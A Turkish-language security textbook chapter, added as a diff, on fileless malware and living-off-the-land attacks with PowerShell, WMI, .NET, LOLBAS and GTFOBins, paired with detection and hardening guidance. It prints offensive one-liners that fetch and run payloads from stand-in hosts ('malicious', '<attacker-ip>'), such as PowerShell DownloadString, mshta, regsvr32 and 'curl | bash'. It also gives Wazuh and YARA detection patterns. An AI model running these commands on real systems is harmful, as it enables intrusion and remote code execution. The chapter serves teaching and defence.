@@ -1,0 +1,348 @@
+# 7.3. Dosyasız Zararlı Yazılımlar (Fileless Malware) ve Bellek İçi Saldırılar (Living off the Land)
+
+---
+
+## 7.3.1. Giriş ve Kavramsal Çerçeve
+
+Geleneksel güvenlik çözümleri, disk üzerinde iz bırakan zararlı yürütülebilir dosyaları tespit etme prensibi üzerine inşa edilmiştir. Ancak günümüz tehdit aktörleri, **dosyasız zararlı yazılım (fileless malware)** teknikleriyle bu paradigmayı tamamen değiştirmiştir. Dosyasız zararlı yazılım, geleneksel yürütülebilir dosyaları diske yazmadan, doğrudan sistem belleğinde (RAM) çalışan ve imza tabanlı tespit mekanizmalarını tamamen bypass eden bir tehdit kategorisidir.
+
+Bu saldırı vektörlerinin temelini **"Living Off the Land" (LOTL)** konsepti oluşturur. Saldırganlar, hedef sistemde zaten mevcut olan ve güvenilen yerel araçları (PowerShell, WMI, .NET, vb.) kötüye kullanarak, yeni zararlı yazılım dosyaları indirme veya yükleme ihtiyacını ortadan kaldırır. Bu teknikler, son yirmi beş yıldır aktif olarak kullanılmakta olup, günümüzde neredeyse hiçbir APT (Gelişmiş Kalıcı Tehdit) saldırısı bu yöntemler olmadan gerçekleştirilememektedir.
+
+MITRE ATT&CK çerçevesinde, dosyasız saldırılar ve LOTL teknikleri, **Defense Evasion** (Savunmadan Kaçınma), **Execution** (Çalıştırma), **Persistence** (Kalıcılık) ve **Privilege Escalation** (Ayrıcalık Yükseltme) taktikleri altında geniş bir yelpazede sınıflandırılmaktadır.
+
+---
+
+## 7.3.2. Dosyasız Zararlı Yazılım Vektörleri: PowerShell, WMI ve .NET
+
+### 7.3.2.1. PowerShell Tabanlı Saldırılar
+
+PowerShell, Windows işletim sistemlerinde yönetim görevleri için tasarlanmış güçlü bir komut satırı kabuğu ve betik dilidir. Saldırganlar, PowerShell'in yeteneklerini şu şekillerde kötüye kullanır:
+
+**Offansif Perspektif:**
+
+```powershell
+# Disk izi bırakmadan bellek içi çalıştırma
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand <Base64_encoded_payload>
+
+# Doğrudan bellekten yükleme ve çalıştırma
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious/payload.ps1')"
+```
+
+Araştırmalar, PowerShell çalıştırılmasının dosyasız zararlı yazılım olaylarının **%77,6'sında** tespit edildiğini, ancak Script Block Log kanıtlarının yalnızca %30,6'sında mevcut olduğunu göstermektedir. Bu orantısızlık, kurumsal ortamlarda PowerShell loglamasının yetersiz yapılandırıldığını ve saldırganların bu zafiyetten faydalandığını ortaya koymaktadır.
+
+**Defansif Perspektif:**
+
+- **PowerShell Script Block Logging (Event ID 4104)** etkinleştirilmelidir
+- **AMSI (Anti-Malware Scan Interface)** entegrasyonu zorunludur
+- **Constrained Language Mode** ile PowerShell'in kısıtlı modda çalıştırılması sağlanmalıdır
+- **PowerShell Transcription** ile tüm oturumlar kayıt altına alınmalıdır
+
+### 7.3.2.2. WMI (Windows Management Instrumentation) Tabanlı Saldırılar
+
+WMI, Windows sistemlerinde yönetim ve otomasyon için kullanılan bir altyapıdır. Saldırganlar WMI'yı şu amaçlarla kullanır:
+
+**Offansif Perspektif - WMI Kalıcılık:**
+
+WMI olay abonelikleri, dosyasız kalıcılık sağlamanın en sofistike yöntemlerinden biridir. Zararlı kod, WMI deposunda saklanır ve belirli bir olay tetiklendiğinde çalıştırılır.
+
+```powershell
+# WMI Event Subscription ile kalıcılık
+# WMI sınıfı oluşturma ve Base64 kodlu miner yükleme
+$mon = ([WmiClass] 'root\default:Office_Updater').Properties['mon'].Value
+```
+
+**WannaMine** dosyasız kripto para madenciliği solucanı, PowerShell ve WMI kullanarak tamamen bellek içinde çalışır ve WMI olay abonelikleri ile kalıcılık sağlar. WMI kalıcılığı, dosyasız olayların **%46,9'unda** tespit edilmiş olmasına rağmen, WMI abonelik artefaktlarının kurtarılma oranı **%0** olarak ölçülmüştür. Bu, WMI tabanlı saldırıların adli bilişim açısından ne kadar zor tespit edilebilir olduğunu göstermektedir.
+
+**Defansif Perspektif:**
+
+- WMI etkinlik günlüğü (Event ID 5858, 5860, 5861) aktifleştirilmelidir
+- WMI olay abonelikleri düzenli olarak denetlenmelidir
+- Anormal WMI sınıf oluşturma ve EventConsumer işlemleri izlenmelidir
+
+### 7.3.2.3. .NET ve Bellek İçi Enjeksiyon
+
+.NET Framework, saldırganların bellek içi kod çalıştırması için zengin bir ortam sunar. **Process Injection (T1055)**, dosyasız saldırıların en yaygın tekniklerinden biridir ve MITRE ATT&CK çerçevesinde en çok kullanılan teknik olarak sıralanmaktadır.
+
+**Offansif Perspektif:**
+
+```csharp
+// .NET ile bellek içi assembly yükleme
+[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, (, [string[]] (' ')))
+```
+
+**Process Doppelgänging (T1055.013)** gibi gelişmiş enjeksiyon teknikleri, Windows'un işlem yükleme mekanizmasını manipüle ederek, meşru bir sürecin belleğini zararlı kodla değiştirir ve dosyasız saldırıların güvenlik önlemlerinden kaçmasını sağlar.
+
+---
+
+## 7.3.3. LOLBAS (Living Off The Land Binaries and Scripts) Konsepti
+
+### 7.3.3.1. LOLBAS Projesi ve Kapsamı
+
+**LOLBAS** (Living Off The Land Binaries and Scripts), Microsoft veya diğer saygın satıcılar tarafından imzalanmış veya Windows'a özgü, kötüye kullanılabilir işlevselliğe sahip yürütülebilir dosyaları, betikleri ve kütüphaneleri kategorize eden bir projedir. Bu araçlar tek başlarına zararlı değildir; ancak saldırganlar tarafından kötü amaçlarla kullanılabilirler.
+
+| LOLBAS Kategorisi | Örnek Araçlar | Kötüye Kullanım Amacı |
+|---|---|---|
+| **Dosya Çalıştırma** | `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `wmic.exe` | Uzaktan kod çalıştırma, DLL yükleme |
+| **Kod Derleme** | `csc.exe`, `vbc.exe`, `ilasm.exe`, `jsc.exe` | Anında zararlı kod derleme |
+| **Dosya İşlemleri** | `bitsadmin.exe`, `certoc.exe`, `cmdL32.exe` | Dosya indirme/yükleme, veri sızdırma |
+| **Ağ İşlemleri** | `certutil.exe`, `ftp.exe`, `powershell.exe` | C2 iletişimi, veri eksfiltasyonu |
+
+**Kaynak:** Security Vision - The Living off the Land Family
+
+### 7.3.3.2. Kritik LOLBAS Örnekleri ve Saldırı Senaryoları
+
+**1. mshta.exe (Microsoft HTML Application Host)**
+
+Mshta.exe, HTML uygulamalarını (.hta) çalıştırmak için meşru bir Windows ikili dosyasıdır. Saldırganlar bunu şu şekillerde kötüye kullanır:
+
+```bash
+# Uzaktan HTA dosyası çalıştırma
+mshta.exe http://<attacker-ip>/malicious.hta
+
+# Inline VBScript ile doğrudan çalıştırma (diske dosya yazmadan)
+mshta.exe "vbscript:Execute(CreateObject(""Wscript.Shell"").Run(""calc.exe""))"
+
+# JavaScript ile uzaktan kod çalıştırma
+mshta.exe "javascript:alert('Hello');close();"
+```
+
+**Tespit Stratejileri**:
+- Windows Event ID 4688 (Process Creation) ile mshta.exe çalıştırmaları izlenmeli
+- Komut satırı argümanlarında `http://`, `https://`, `vbscript:`, `javascript:` pattern'leri aranmalı
+- Ebeveyn-çocuk süreç ilişkileri analiz edilmeli (örn. `cmd.exe → mshta.exe`)
+
+**2. regsvr32.exe (Squiblydoo Tekniği - T1218.010)**
+
+Regsvr32.exe, COM sınıflarını kaydetmek için kullanılır. "Squiblydoo" olarak bilinen saldırı tekniğinde, uzaktan barındırılan bir SCT dosyası aracılığıyla kod çalıştırılır:
+
+```bash
+regsvr32.exe /s /n /u /i:http://attacker/file.sct scrobj.dll
+```
+
+**3. odbcconf.exe (T1218.008)**
+
+ODBC yapılandırma aracı, DLL dosyalarını yüklemek için kötüye kullanılabilir:
+
+```bash
+# DLL yükleme
+odbcconf /a {REGSVR C:\path\to\malicious.dll}
+
+# Sürücü yükleme (Admin gerektirir)
+odbcconf INSTALLDRIVER "malicious|Driver=C:\path\to\malicious.dll|APILevel=2"
+```
+
+**4. bitsadmin.exe**
+
+Background Intelligent Transfer Service (BITS), dosya transferleri için kullanılır. Saldırganlar, zararlı payload'ları indirmek için kullanır:
+
+```bash
+bitsadmin /create 1
+bitsadmin /addfile 1 http://malicious/payload.exe C:\Temp\payload.exe
+bitsadmin /resume 1
+```
+
+### 7.3.3.3. LOLBAS Tespitinde Zorluklar
+
+LOLBAS araçlarının tespit edilmesindeki en büyük zorluk, bu araçların meşru sistem yönetimi faaliyetleriyle neredeyse birebir aynı davranışı sergilemesidir. Saldırganlar, meşru yönetici aktiviteleri arasında gizlenir ve geleneksel güvenlik yazılımları bu aktiviteleri şüpheli olarak işaretlemez.
+
+**Temel Tespit Yaklaşımları**:
+1. **Anomali tabanlı davranış analizi**: Normal kullanım kalıplarının öğrenilmesi ve sapmaların tespiti
+2. **Komut satırı argüman analizi**: Anormal parametre kombinasyonlarının belirlenmesi
+3. **Süreç zinciri analizi**: Beklenmeyen ebeveyn-çocuk süreç ilişkilerinin tespiti
+4. **Ağ bağlantı analizi**: LOLBAS araçlarının olağandışı ağ bağlantıları kurmasının izlenmesi
+
+---
+
+## 7.3.4. GTFOBins: Linux Dünyasında Living Off The Land
+
+**GTFOBins** (Unix binaries), LOLBAS projesinden ilham alan ve Unix/Linux ikili dosyalarının kötüye kullanımını kataloglayan bir projedir. Linux sistemlerinde, saldırganlar sistemde zaten mevcut olan araçları kullanarak güvenlik kısıtlamalarını bypass eder, ayrıcalık yükseltir ve ters kabuk (reverse shell) bağlantıları kurar.
+
+| GTFOBin Örneği | Kötüye Kullanım Fonksiyonu | Örnek Komut |
+|---|---|---|
+| **awk** | Ters kabuk | `awk 'BEGIN {system("/bin/bash")}'` |
+| **vim** | Kabuk çalıştırma | `vim -c ':!/bin/bash'` |
+| **curl/wget** | Dosya indirme ve çalıştırma | `curl http://malicious/payload | bash` |
+| **getcap** | Yetenek keşfi | `getcap -r / 2>/dev/null` |
+
+GTFOBins projesi; ters kabuk, dosya yükleme, dosya indirme, ayrıcalık yükseltme ve kabuk kısıtlamalarından kaçış gibi çeşitli kategorilerde kötüye kullanım tekniklerini listelemektedir.
+
+---
+
+## 7.3.5. Savunma Derinliği: Tespit ve Müdahale Stratejileri
+
+### 7.3.5.1. Loglama ve İzleme Altyapısı
+
+Dosyasız saldırıları tespit etmek için çok katmanlı bir loglama stratejisi gereklidir:
+
+**Windows Log Kaynakları ve İlgili Event ID'leri:**
+
+| Log Kaynağı | Event ID | Tespit Amacı |
+|---|---|---|
+| PowerShell Operational | 4104 | Script Block Logging - Zararlı betik içeriği |
+| Sysmon | 1 | Süreç oluşturma - Kodlanmış komut çalıştırma |
+| Security | 4688 | Süreç oluşturma - Komut satırı argümanları |
+| WMI Activity | 5858, 5860, 5861 | WMI etkinlikleri ve abonelik oluşturma |
+| AMSI | 1116-1118 | Anti-Malware Scan Interface - Zararlı betik tespiti |
+
+### 7.3.5.2. Sigma Tabanlı Tespit Kuralları
+
+**Sigma**, log tabanlı tespit kurallarını tanımlamak için kullanılan, SIEM sistemleri arasında taşınabilir bir formattır.
+
+Örnek Sigma Kuralı - LOLBAS Veri Sızdırma Tespiti:
+
+```yaml
+title: LOLBAS Data Exfiltration by DataSvcUtil.exe
+id: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+status: experimental
+description: Detects data exfiltration using DataSvcUtil.exe
+references:
+  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\DataSvcUtil.exe'
+  condition: selection
+level: medium
+```
+
+**Kaynak:** Sigma Rules - LOLBAS Data Exfiltration
+
+### 7.3.5.3. Wazuh ile Dosyasız Zararlı Yazılım Tespiti
+
+Wazuh, dosyasız zararlı yazılımları tespit etmek için hazır kural setleri sunar. Bu kurallar, sistem yardımcı programlarının kötüye kullanımını tespit eder:
+
+**Örnek Wazuh Kural Yapılandırması:**
+
+```xml
+<rule id="100100" level="10">
+  <if_sid>5716</if_sid>
+  <match>powershell.exe</match>
+  <regex>IEX|DownloadString|Invoke-Expression</regex>
+  <description>Fileless malware detection via PowerShell</description>
+</rule>
+```
+
+### 7.3.5.4. Derinlemesine Savunma Mimarisi
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                        SAVUNMA DERİNLİĞİ KATMANLARI                    │
+├─────────────────────────────────────────────────────────────────────────┤
+│  KATMAN 6: Süreç Davranış Analizi (EDR)                                │
+│  - Anormal süreç zincirleri, bellek enjeksiyonu tespiti               │
+│  - MITRE ATT&CK T1055 (Process Injection) izleme                      │
+├─────────────────────────────────────────────────────────────────────────┤
+│  KATMAN 5: Uygulama Kontrolü (AppLocker / WDAC)                       │
+│  - mshta.exe, regsvr32.exe gibi LOLBAS araçlarının kısıtlanması       │
+│  - Yalnızca imzalı ve izin verilen betiklerin çalıştırılması          │
+├─────────────────────────────────────────────────────────────────────────┤
+│  KATMAN 4: Betik Motoru Koruması (AMSI, Constrained Language Mode)    │
+│  - PowerShell ve WMI betiklerinin çalışma zamanı analizi              │
+│  - Zararlı betiklerin yürütülmesinin engellenmesi                     │
+├─────────────────────────────────────────────────────────────────────────┤
+│  KATMAN 3: Loglama ve İzleme (SIEM / Wazuh)                           │
+│  - Event ID 4104, 4688, 5858 loglarının toplanması ve analizi        │
+│  - Sigma kuralları ile anomali tespiti                                │
+├─────────────────────────────────────────────────────────────────────────┤
+│  KATMAN 2: Bellek Adli Bilişimi (Memory Forensics)                    │
+│  - YARA ile bellek taraması, Volatility analizi                       │
+│  - Dosyasız zararlı yazılım kalıntılarının tespiti                   │
+├─────────────────────────────────────────────────────────────────────────┤
+│  KATMAN 1: Ağ Telemetrisi (NDR)                                       │
+│  - SCM RPC çağrıları, servis konfigürasyon trafiği analizi           │
+│  - Dosyasız yanal hareketin (lateral movement) tespiti               │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+**Kaynak:** Trellix NDR - Silent Pivot: Detecting Fileless Lateral Movement; NIST SP 800-53 Malicious Code Protection
+
+### 7.3.5.5. Bellek Adli Bilişimi ve YARA
+
+Geleneksel disk tabanlı taramalar dosyasız zararlı yazılımları tespit edemez. Bu nedenle, **bellek adli bilişimi** kritik önem taşır:
+
+```yara
+rule Fileless_PowerShell_Injection {
+    meta:
+        description = "Detects PowerShell memory injection patterns"
+    strings:
+        $ps1 = /powershell.*-e.*[A-Za-z0-9+\/=]{20,}/
+        $ps2 = /IEX.*New-Object.*Net\.WebClient/
+    condition:
+        $ps1 or $ps2
+}
+```
+
+Güncel araştırmalar, **derin öğrenme ve bellek adli bilişimi entegrasyonunun**, dosyasız saldırı tespitinde %85'e varan doğruluk oranları sağladığını göstermektedir.
+
+---
+
+## 7.3.6. Uluslararası ve Yerel Standartlar ile Uyum
+
+### 7.3.6.1. NIST Standartları
+
+**NIST SP 800-53 Rev. 5 - SI-3 (Malicious Code Protection)**:
+- İmza tabanlı ve imza dışı (nonsignature-based) teknolojilerin kullanılmasını zorunlu kılar
+- Yapay zeka ve sezgisel (heuristic) yöntemlerle zararlı kod davranışlarının analiz edilmesini önerir
+- Sistem giriş/çıkış noktalarında zararlı kod koruma mekanizmalarının uygulanmasını gerektirir
+
+**NIST SP 800-61 (Incident Handling)**:
+- Olay müdahale süreçlerinde dosyasız zararlı yazılım özelinde prosedürler geliştirilmesini önerir
+- Bellek adli bilişiminin olay müdahale planlarına entegre edilmesini vurgular
+
+### 7.3.6.2. CIS Controls
+
+| CIS Control | Dosyasız Malware ile İlişkisi |
+|---|---|
+| **Control 8 (Audit Log Management)** | PowerShell Script Block Logging, WMI etkinlik loglaması zorunluluğu |
+| **Control 2 (Inventory and Control of Software Assets)** | AppLocker/Application Control ile LOLBAS araçlarının kısıtlanması |
+| **Control 10 (Malware Defenses)** | AMSI, davranış tabanlı tespit, bellek taraması gerekliliği |
+
+### 7.3.6.3. Türkiye'deki Yasal Düzenlemeler ve Yükümlülükler
+
+**5651 Sayılı Kanun (İnternet Ortamında Yapılan Yayınların Düzenlenmesi)**:
+- İnternet erişimi sağlayan işletmelerin ağ trafiğini düzenli olarak loglaması zorunludur
+- Log kayıtlarının belirli bir süre saklanması ve yetkili mercilere sunulması gerekmektedir
+- 5651 loglama çözümleri, KVKK uyumluluğu ile entegre şekilde yapılandırılmalıdır
+
+**KVKK (6698 Sayılı Kişisel Verilerin Korunması Kanunu)**:
+- Log verilerinde kişisel veri barındırılması durumunda, veri minimizasyonu ve anonimleştirme prensipleri uygulanmalıdır
+- Log saklama süreleri ve veri güvenliği önlemleri KVKK standartlarına uygun olmalıdır
+
+**BDDK Siber Güvenrik Düzenlemeleri**:
+- Bankacılık sektöründe siber olay loglarının en az 1 yıl saklanması zorunludur
+- Saldırı tespit ve müdahale sistemlerinin (SIEM, EDR) bulundurulması ve düzenli test edilmesi gerekmektedir
+- Dosyasız zararlı yazılım saldırılarına karşı özel tespit mekanizmaları kurulmalıdır
+
+---
+
+## 7.3.7. Sonuç ve Öneriler
+
+Dosyasız zararlı yazılımlar ve Living Off the Land saldırıları, modern siber güvenlik tehditlerinin en sofistike ve tespiti en zor olanları arasında yer almaktadır. Geleneksel imza tabanlı güvenlik çözümleri bu tehditlere karşı yetersiz kalmaktadır.
+
+**Kurumsal Öneriler:**
+
+1. **Loglama Altyapısının Güçlendirilmesi**: PowerShell Script Block Logging (Event ID 4104), WMI etkinlik loglaması, Sysmon yapılandırması zorunlu hale getirilmelidir.
+
+2. **Davranış Tabanlı Tespit**: Yalnızca imza tabanlı tespitle yetinilmemeli; anomali tabanlı davranış analizi, makine öğrenmesi ve bellek adli bilişimi çözümleri entegre edilmelidir.
+
+3. **Uygulama Kontrolü**: AppLocker veya Windows Defender Application Control (WDAC) ile mshta.exe, regsvr32.exe, wmic.exe gibi kritik LOLBAS araçlarının çalıştırılması kısıtlanmalıdır.
+
+4. **AMSI ve PowerShell Koruması**: PowerShell Constrained Language Mode etkinleştirilmeli, AMSI entegrasyonu sağlanmalıdır.
+
+5. **Sürekli Tehdit Avcılığı (Threat Hunting)**: LOLBAS ve GTFOBins projeleri düzenli olarak takip edilmeli, yeni kötüye kullanım tekniklerine karşı tespit kuralları güncellenmelidir.
+
+6. **Yasal Uyum**: 5651 Sayılı Kanun ve KVKK gereklilikleri doğrultusunda loglama politikaları oluşturulmalı, log verileri güvenli bir şekilde saklanmalıdır.
+
+Dosyasız zararlı yazılımlara karşı etkili bir savunma, çok katmanlı bir yaklaşımı gerektirir. Savunma derinliği felsefesiyle, her katmanda (ağ, uç nokta, uygulama, veri) proaktif tespit ve önleme mekanizmaları kurulmalı; olay müdahale ekipleri dosyasız saldırı senaryolarına özel prosedürlerle donatılmalıdır.
+
+---
+
+**Referanslar:**
+1. MITRE ATT&CK Framework - T1055 (Process Injection), T1218 (Signed Binary Proxy Execution)
+2. NIST Special Publication 800-53 Rev. 5 - SI-3 Malicious Code Protection
+3. LOLBAS Project - https://lolbas-project.github.io/
+4. GTFOBins Project - https://gtfobins.github.io/
+5. Wazuh Documentation - Malware Detection
+6. Sigma Rules - LOLBAS Detection
